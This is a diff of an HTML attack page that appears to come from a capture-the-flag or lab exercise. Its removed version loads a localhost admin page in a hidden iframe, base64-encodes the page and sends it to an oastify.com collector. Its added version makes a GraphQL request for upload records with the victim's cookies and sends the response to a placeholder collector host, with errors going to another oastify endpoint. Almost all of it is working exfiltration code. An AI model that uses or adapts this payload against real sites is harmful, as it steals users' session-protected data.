@@ -1,29 +1,52 @@
 <!DOCTYPE html>
 <html>
-<head><title>Steal Admin Page</title></head>
-<body>
-<iframe id="adminFrame" src="http://127.0.0.1:3000/admin" style="display:none"></iframe>
-<script>
-  const iframe = document.getElementById('adminFrame');
-  iframe.onload = () => {
-    try {
-      // Access the iframe's document (same origin: localhost)
-      const adminDoc = iframe.contentDocument || iframe.contentWindow.document;
-      const htmlText = adminDoc.documentElement.outerHTML;
+  <body>
+    <script>
+      // The GraphQL query
+      const query = {
+        query: `
+          query {
+            uploads {
+              id
+              filename
+              size
+              uploadDate
+              uploadedBy
+            }
+          }
+        `
+      };
 
-      // Base64 encode
-      const base64Html = btoa(unescape(encodeURIComponent(htmlText)));
-
-      // Send to collaborator
-      fetch("https://m8vnqd7dq1umgppcs5ki7c5xooufi96y.oastify.com/collect", {
+      // Send the GraphQL request using victim's cookies
+      fetch("http://94.237.51.19:48620/graphql", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ data: base64Html })
+        credentials: "include", // include cookies like connect.sid
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(query)
+      })
+      .then(res => res.json())
+      .then(data => {
+        // Exfiltrate the data to your server
+        fetch("https://YOUR-COLLECTOR-HOST/collect", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
+      })
+      .catch(err => {
+        // Optional: exfiltrate error for debugging
+        fetch("https://mj9n1did115mrp0c35viicgxzo5ftahz.oastify.com/collect", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ error: err.toString() })
+        });
       });
-    } catch (e) {
-      console.error("Error accessing iframe content:", e);
-    }
-  };
-</script>
-</body>
+    </script>
+  </body>
 </html>
